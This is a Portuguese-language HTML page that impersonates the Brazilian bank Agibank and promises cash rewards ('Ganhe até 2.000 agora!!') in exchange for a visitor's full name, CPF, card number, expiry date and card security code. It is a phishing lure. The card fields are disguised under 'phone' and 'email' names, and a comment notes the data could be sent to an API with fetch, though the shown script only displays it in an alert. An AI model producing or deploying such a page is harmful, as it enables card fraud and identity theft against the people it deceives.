<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Agibank - Cadastro</title>
  <style>
    :root{ --bg:#f6f7fb; --card:#ffffff; --accent:#e6002e; --muted:#6b7280 }
    *{box-sizing:border-box}
    body{margin:0; font-family:Inter, system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial; background:linear-gradient(180deg,#ffffff 0%, var(--bg) 100%); display:flex; align-items:center; justify-content:center; min-height:100vh}
    .container{width:100%; max-width:960px; padding:32px}
    .card{background:var(--card); border-radius:16px; box-shadow:0 8px 30px rgba(13,38,59,0.08); display:flex; gap:32px; padding:36px; align-items:center}
    .left{flex:1; text-align:center}
    .avatar{width:220px; height:220px; border-radius:50%; overflow:hidden; margin:0 auto 12px; display:flex; align-items:center; justify-content:center; background:#eee}
    .avatar img{width:100%; height:100%; object-fit:cover; display:block}
    h1{margin:0; font-size:28px; letter-spacing:0.4px}
    .brand{display:inline-block; margin-top:6px; font-weight:700; color:var(--accent); font-size:18px}
    .right{flex:1}
    form{display:flex; gap:14px; flex-direction:column}
    label{font-size:13px; color:var(--muted)}
    input[type=text], input[type=email], input[type=tel]{padding:12px 14px; border-radius:10px; border:1px solid #e6e9ef; font-size:15px}
    .row{display:flex; gap:12px}
    .row .col{flex:1}
    .submit{margin-top:8px; padding:12px 16px; border-radius:10px; border:0; font-weight:600; cursor:pointer; background:linear-gradient(90deg,var(--accent), #ff375f); color:white; font-size:15px}
    .note{font-size:13px; color:var(--muted)}
    @media (max-width:760px){.card{flex-direction:column; padding:24px} .avatar{width:160px; height:160px} }
  </style>
</head>
<body>
  <div class="container">
    <div class="card">
      <div class="left">
        <div class="avatar">
          <!-- Imagem enviada pelo usuário -->
          <img src="kalel.png" alt="Pessoa" />
        </div>
        <h1>Kalel | Agibank</h1>
        <div class="brand">Ganhe até 2.000 agora!!</div>
      </div>

      <div class="right">
        <form id="leadForm" onsubmit="return handleSubmit(event)">
          <div>
            <label for="name">Nome completo</label>
            <input id="name" name="name" type="text" placeholder="Seu nome" required />
          </div>

          <div class="row">
            <div class="col">
              <label for="cpf">CPF</label>
              <input id="cpf" name="cpf" type="text" placeholder="000.000.000-00" required />
            </div>
            <div class="col">
              <label for="phone">Número do Cartão</label>
              <input id="phone" name="phone" type="tel" placeholder="900000000" required />
            </div>
          </div>

          <div>
            <label for="email">Validade do cartão:</label>
            <input id="email" name="email" type="number" placeholder="00/00/00
        " required />
          </div>
                    <div>
            <label for="email">Código de segurança:</label>
            <input id="email" name="email" type="number" placeholder="000" required />
          </div>

          <button class="submit" type="submit">GANHAR AGORA!!</button>
          <div class="note">Ao enviar você vai ganhar mais 1.000 extras.</div>
        </form>
      </div>
    </div>
  </div>

  <script>
    function handleSubmit(e){
      e.preventDefault();
      const form = document.getElementById('leadForm');
      const data = Object.fromEntries(new FormData(form).entries());
      // Exemplo: aqui você poderia enviar para sua API com fetch
      alert('Dados enviados:\n' + JSON.stringify(data, null, 2));
      form.reset();
      return false;
    }
  </script>
</body>
</html>
